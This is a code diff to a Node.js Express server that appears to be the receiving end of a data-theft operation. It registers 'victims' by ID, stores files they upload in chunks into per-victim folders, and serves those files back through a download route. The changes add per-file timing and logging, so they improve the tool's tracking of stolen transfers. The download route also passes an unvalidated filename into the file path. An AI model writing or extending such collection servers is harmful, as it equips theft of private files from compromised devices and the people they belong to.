@@ -5,7 +5,7 @@ const express = require('express');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8080;
+const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
 
 // Enable CORS with specific options
 const corsOptions = {
@@ -83,6 +83,8 @@ app.post('/upload', (req, res) => {
         totalUploadTime: 0,
         fileList: [],
         fileDurations: {},  // Track individual file transfer durations
+        fileStartTimes: {},  // Track individual file start times
+        fileEndTimes: {},    // Track individual file end times
       };
     } else {
       connectedDevices[victimId].lastConnectionTime = new Date();
@@ -101,6 +103,9 @@ app.post('/upload', (req, res) => {
 
     // Track the start time for the file upload
     const startTime = Date.now();
+    if (!connectedDevices[victimId].fileStartTimes[filename]) {
+      connectedDevices[victimId].fileStartTimes[filename] = startTime;
+    }
 
     fs.appendFile(filePath, req.body, (err) => {
       if (err) {
@@ -122,6 +127,7 @@ app.post('/upload', (req, res) => {
 
         // Calculate total upload time once all chunks are received
         const endTime = Date.now();
+        connectedDevices[victimId].fileEndTimes[filename] = endTime; // Record end time for this file
         const uploadDuration = (endTime - startTime) / 1000; // in seconds
         connectedDevices[victimId].totalUploadTime += uploadDuration;
 
@@ -147,6 +153,7 @@ app.get('/download/:victimId/:filename', (req, res) => {
   try {
     const { victimId, filename } = req.params;
 
+    // Check if victim folder exists first
     if (!victimFolders[victimId]) {
       return res.status(404).json({ error: 'Victim folder not found' });
     }
@@ -154,17 +161,24 @@ app.get('/download/:victimId/:filename', (req, res) => {
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
 
+    // Check if the file exists in the folder
     if (!fs.existsSync(filePath)) {
+      console.log(`❌ File not found at ${filePath}`);
       return res.status(404).json({ error: 'File not found' });
     }
 
+    console.log(`📂 Downloading file from: ${filePath}`);
+    
+    // Proceed to download the file
     res.download(filePath, filename, (err) => {
       if (err) {
+        console.error(`❌ Error sending file:`, err);
         return res.status(500).json({ error: 'Error sending file' });
       }
     });
 
   } catch (error) {
+    console.error(`❌ Error in download route:`, error);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
